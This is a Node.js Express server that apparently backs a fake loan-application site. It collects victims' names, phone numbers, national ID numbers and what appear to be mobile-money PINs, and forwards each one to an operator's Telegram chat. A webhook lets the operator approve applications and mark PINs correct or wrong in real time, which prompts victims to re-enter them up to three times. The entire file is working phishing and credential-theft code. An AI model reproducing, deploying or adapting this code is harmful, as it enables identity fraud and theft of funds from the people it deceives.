const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ENV
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Telegram API base (FIXED)
const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;

// USERS STORAGE
const users = {};

// ================= HOME =================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ================= 1. APPLY =================
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  if (!name || !phone || !network || !amount || !nationalId) {
    return res.status(400).send("Missing fields");
  }

  users[phone] = {
    name,
    phone,
    network,
    amount,
    nationalId,
    status: "pending",
    pinStatus: "waiting",
    attempts: 0
  };

  const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${name}
📱 Phone: ${phone}
📡 Network: ${network}
💰 Amount: ${amount}
🆔 ID: ${nationalId}
`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ APPROVE", callback_data: `approve_${phone}` },
        { text: "❌ DECLINE", callback_data: `decline_${phone}` }
      ]
    ]
  };

  try {
    await axios.post(`${TG}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: keyboard
    });

    res.sendStatus(200);
  } catch (err) {
    console.log("Telegram Error:", err.message);
    res.status(500).send("Telegram failed");
  }
});

// ================= 2. STATUS =================
app.get("/status/:phone", (req, res) => {
  const user = users[req.params.phone];
  res.json({ status: user ? user.status : "unknown" });
});

// ================= 3. PIN STATUS =================
app.get("/check-pin-status/:phone", (req, res) => {
  const user = users[req.params.phone];

  res.json({
    status: user ? user.pinStatus : "unknown",
    attempt: user ? user.attempts : 0
  });
});

// ================= 4. PIN SUBMIT =================
app.post("/send-pin", async (req, res) => {
  const { phone, pin } = req.body;

  if (!users[phone]) return res.sendStatus(404);

  users[phone].attempts += 1;
  users[phone].pinStatus = "verifying";

  const message = `
🔐 PIN RECEIVED (${users[phone].attempts}/3)

📱 Phone: ${phone}
🔑 PIN: ${pin}
`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✔ PIN CORRECT", callback_data: `pinok_${phone}` },
        { text: "❌ WRONG PIN", callback_data: `pinwrong_${phone}` }
      ]
    ]
  };

  try {
    await axios.post(`${TG}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: keyboard
    });

    res.sendStatus(200);
  } catch (err) {
    console.log("PIN send error:", err.message);
    res.sendStatus(500);
  }
});

// ================= 5. WEBHOOK =================
app.post("/webhook", async (req, res) => {
  const body = req.body;

  if (!body.callback_query) return res.sendStatus(200);

  const data = body.callback_query.data;
  const [command, phone] = data.split("_");

  if (!users[phone]) return res.sendStatus(200);

  let feedbackText = "";

  if (command === "approve") {
    users[phone].status = "approved";
    feedbackText = `User ${phone} APPROVED`;
  }

  if (command === "decline") {
    users[phone].status = "declined";
    feedbackText = `User ${phone} DECLINED`;
  }

  if (command === "pinok") {
    users[phone].pinStatus = "success";
    feedbackText = `PIN correct for ${phone}`;
  }

  if (command === "pinwrong") {
    users[phone].pinStatus = "re-enter";
    feedbackText = `PIN wrong for ${phone} (${users[phone].attempts}/3)`;
  }

  try {
    await axios.post(`${TG}/sendMessage`, {
      chat_id: CHAT_ID,
      text: feedbackText
    });
  } catch (e) {
    console.log("Webhook TG error:", e.message);
  }

  res.sendStatus(200);
});

// ================= START =================
const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log("Server running on port " + PORT);
});
